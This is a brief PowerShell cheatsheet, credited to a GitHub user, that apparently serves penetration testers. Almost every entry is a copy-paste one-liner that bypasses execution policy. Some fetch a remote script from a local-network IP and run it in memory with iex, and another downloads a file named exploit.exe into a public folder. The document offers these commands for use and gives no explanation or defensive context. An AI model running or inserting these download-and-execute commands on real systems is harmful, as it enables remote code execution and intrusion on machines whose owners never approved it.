### Powershell-Cheatsheet
source: [github user frizb](https://www.github.com/frizb)


##### Check the Powershell Version

```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
```

##### Test if you can run PowerShell Version 2

```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
```

##### Execute Remote Powershell from windows command prompt

```cmd
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://192.168.100.10/code.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\code\"
```

##### Execute Remote Powershell from Powershell prompt

```Powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('http://192.168.100.10/code.ps1'))
```

##### Download Remote File Using Powershell from Windows command prompt
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
```

